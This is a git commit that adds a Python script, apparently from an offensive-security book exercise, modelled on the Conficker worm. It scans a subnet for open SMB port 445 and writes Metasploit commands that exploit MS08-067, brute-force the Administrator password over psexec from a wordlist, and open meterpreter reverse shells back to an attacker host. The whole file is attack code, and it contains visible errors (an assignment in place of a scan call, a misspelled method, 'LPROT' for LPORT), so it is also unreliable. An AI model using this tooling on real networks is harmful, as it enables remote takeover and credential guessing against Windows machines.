b0b68c18230bd3bcb363cbe25ab891d7b734a2e6
zhanglongtai <neo_seele@hotmail.com>
2016-04-08 15:18:32 +0800

    create

---
+++ Chapter_02/conflicker.py
@@ -0,0 +1,47 @@
+import nmap
+
+
+def findTgts(subNet):
+    nmScan = nmap.PortScanner()
+    nmScan.scan = (subNet, '445')
+    tgtHosts = []
+    for host in nmScan.all_hostd():
+        if nmScan[host].has_tcp(445):
+            state = nmScan[host]['tcp'][445]['state']
+            if state == 'open':
+                print '[+] Found Target Host: ' + host
+                tgtHosts.append(host)
+    return tgtHosts
+
+
+def setupHandler(configFile, lhost, lport):
+    configFile.write('use exploit/multi/handler\n')
+    configFile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
+    configFile.write('set LPROT ' + str(lport) + '\n')
+    configFile.write('set LHOST ' + lhost + '\n')
+    configFile.write('exploit -j -z\n')
+    configFile.write('setg DisablePayloadHandler 1\n')
+
+
+def conflickerExploit(configFile, tgtHost, lhost, lport):
+    configFile.write('use exploit/windows/smb/ms08_067_netapi\n')
+    configFile.write('set RHOST ' + str(tgtHost) + '\n')
+    configFile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
+    configFile.write('set LPROT ' + str(lport) + '\n')
+    configFile.write('set LHOST ' + lhost + '\n')
+    configFile.write('exploit -j -z\n')
+
+
+def smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
+    username = 'Administrator'
+    pF = open(passwdFile, 'r')
+    for password in pF.readlines():
+        password = password.strip('\n').strip('\r')
+        configFile.write('use exploit/windows/smb/psexec\n')
+        configFile.write('set SMBUser ' + str(username) + '\n')
+        configFile.write('set SMBPass ' + str(password) + '\n')
+        configFile.write('set RHOST ' + str(tgtHost) + '\n')
+        configFile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
+        configFile.write('set LPROT ' + str(lport) + '\n')
+        configFile.write('set LHOST ' + lhost + '\n')
+        configFile.write('exploit -j -z\n')
